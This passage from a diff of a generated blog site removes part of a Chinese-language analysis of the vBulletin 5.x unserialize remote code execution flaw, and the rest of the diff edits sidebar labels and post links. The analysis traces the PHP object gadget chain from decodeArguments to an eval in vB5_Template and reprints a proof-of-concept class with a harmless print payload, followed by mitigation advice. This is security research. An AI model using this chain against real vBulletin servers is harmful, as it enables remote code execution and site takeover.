-</code></pre><p>最终输出的是 <code>serialize(new vB_vURL())</code>的值，向类vB_vURL注入了一个public变量$temfile，并且赋值为类vB_View_AJAXHTML，而类vB_View_AJAXHTML的构造函数中，向其类内对象$content赋值类vB5_Template，最终的利用代码在类vB5_Template中$template和$registered中，含义分别是调用模板widget_php和$registered[‘widgetConfig’]的值为利用代码。</p>
-<h4 id="代码角度分析-1"><a href="#代码角度分析-1" class="headerlink" title="代码角度分析"></a>代码角度分析</h4><p>首先进入hook.php文件的vB_Api_Hook类的decodeArguments方法，传入的值会被进行反序列化操作。变量$args会被赋值为vB_vURL类。</p>
-<pre><code>public function decodeArguments($arguments)
-{
- =&gt; if ($args = @unserialize($arguments))
-    {
-        $result = &apos;&apos;;
-
-     =》foreach ($args AS $varname =&gt; $value)
-        {
-            $result .= $varname;
-
-            if(is_array($value))
-            {
-                $this-&gt;decodeLevel($result, $value, &apos;=&apos;);
-            }
-
-            $result .= &quot;\n&quot;;
-        }
-
-        return $result;
-    }
-
-    return &apos;&apos;;
-}
-</code></pre><p>在foreach中，由于$args为<strong>对象</strong>数据结构，并且当前类（vB_vURL类）并没有implements于Iterator接口，因此当php在遍历对象$args时，只是会遍历vB_vURL类的public变量，不会产生漏洞。</p>
-<p>由于要进行return操作，因此便出发了当前类（vB_vURL类）的析构函数。</p>
-<pre><code>function __destruct()
-{
- =&gt; if (file_exists($this-&gt;tmpfile))
-    {
-        @unlink($this-&gt;tmpfile);
-    }
-}
-</code></pre><p>由于为其$tmpfile赋值为一个对象，file<em>exists方法会试图把类转化为字符串，因此触发了$tmpfile对象的\</em>_toString()方法。（<strong>由于传入的是vB_View_AJAXHTML类，vB_View_AJAXHTML类继承于vB_View类，因此触发的是vB_View类的__toString方法</strong>）</p>
-<pre><code>public function __toString()
-{
-    try
-    {
-       =&gt; return $this-&gt;render();
-    }
-    catch(vB_Exception $e)
-    {
-        //If debug, return the error, else
-        return &apos;&apos;;
-    }
-}
-</code></pre><p>由上文可知，当前$this对象其实还是vB_View_AJAXHTML类的对象，因此进入了vB_View_AJAXHTML类的render()方法，由于定义了vB_View_AJAXHTML类的$content类对象。</p>
-<pre><code>public function render($send_content_headers = false)
-{
-    ...
-
-    if ($this-&gt;content)
-    {
-      =》 $xml-&gt;add_tag(&apos;html&apos;, $this-&gt;content-&gt;render());
-    }
-</code></pre><p>类对象$content已经被赋值为vB5_Template类对象，因此会进入vB5_Template类的render()方法。</p>
-<pre><code>public function render($isParentTemplate = true, $isAjaxTemplateRender = false)
-{
-    $this-&gt;register(&apos;user&apos;, $user, true);
-    extract(self::$globalRegistered, EXTR_SKIP | EXTR_REFS);
- =》extract($this-&gt;registered, EXTR_OVERWRITE | EXTR_REFS);
-
-    ...
-
-    $templateCache = vB5_Template_Cache::instance();
- =》$templateCode = $templateCache-&gt;getTemplate($this-&gt;template);
-    if($templateCache-&gt;isTemplateText())
-    {
-       =》@eval($templateCode);
-    }
-</code></pre><p>vB5_Template类的render()方法，此方法会执行extract()方法和eval()方法，并且都可以控制传入的参数，因此会导致代码执行。再看一次poc。</p>
-<pre><code>&lt;?php
-class vB5_Template {
-    public $tmpfile;
-    protected $template;
-    protected $registered = array();
-    public function __construct() {
-        $this-&gt;template = &apos;widget_php&apos;;
-        $this-&gt;registered[&apos;widgetConfig&apos;] = array(&apos;code&apos; =&gt; &apos;print_r(\&apos;hello manning\&apos;);die();&apos;);
-   }
-}
-</code></pre><p>也就是说，目前我们控制两个关键点。</p>
-<ul>
-<li>要执行的模板</li>
-<li>模板需要的参数</li>
-</ul>
-<p>此时代码已经覆盖了$registered变量的widgetConfig索引，因此会把数组$widgetConfig注册到全局变量内，其var_dump为</p>
-<pre><code>array (size=1)
-    &apos;code&apos; =&gt; string &apos;print_r(&apos;hello manning&apos;);die();&apos; (length=31)
-</code></pre><p>然后模板widget_php存在</p>
-<pre><code>$evaledPHP = vB5_Template_Runtime::parseAction(&apos;bbcode&apos;, &apos;evalCode&apos;, $widgetConfig[&apos;code&apos;]); 
-</code></pre><p>因此，导致代码执行。</p>
-<p><img src="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/2.png"></p>
-<p>0x02 漏洞总结<br>-</p>
-<p>vBulletin 5系列通杀的代码执行漏洞，无难度getshell。这个漏洞可以说是php反序列化操作的最佳反面教程，讲述了使用反序列化不当，造成的严重后果。既可覆盖代码的上下文进行RCE，又可利用传统的方式在魔术方法中进行RCE。</p>
-<p>漏洞小结</p>
-<p>影响范围个人评价为“高”，危害性个人评价为“高”，vBulletin在全球的使用范围非常广，此漏洞在vBulletin 5版本通杀。</p>
-<p>防护方案</p>
-<p>使用反序列化的地方增多了数据的种类，增大了风险。因此防护方案如下：</p>
-<ul>
-<li>使用反序列化结果的地方，检测是否存在危险操作</li>
-<li>尽量避免使用反序列化交互操作</li>
-</ul>
-<p>0x03 引用资料<br>-</p>
-<ul>
-<li><a href="http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq" target="_blank" rel="external">http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq</a></li>
-<li><a href="http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/" target="_blank" rel="external">http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/</a></li>
-<li><a href="http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/" target="_blank" rel="external">http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/</a></li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" data-id="cj63ggoyk000ahtfyr9d2w9qq" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2015/12/22/Java反序列化内容/" data-id="cja2isugw0004rv02rsgtmsbs" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1405,9 +1445,9 @@ class vB5_Template {
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archieven</h3>
+    <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
     </div>
   </div>
 
@@ -1415,9 +1455,13 @@ class vB5_Template {
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recente berichten</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/">Struts2 S2-052远程代码执行漏洞分析 CVE-2017-9805</a>
+          </li>
         
           <li>
             <a href="/2017/08/08/三种特征向量对深度学习攻击检测的影响/">三种特征向量对深度学习攻击检测的影响</a>
@@ -1433,10 +1477,6 @@ class vB5_Template {
         
           <li>
             <a href="/2017/06/13/Spring-Web-Flow-RCE漏洞分析/">Spring Web Flow RCE漏洞分析</a>
-          </li>
-        
-          <li>
-            <a href="/2017/05/05/WordPress-4-6版本远程代码执行漏洞/">WordPress 4.6版本远程代码执行漏洞</a>
           </li>
         
       </ul>
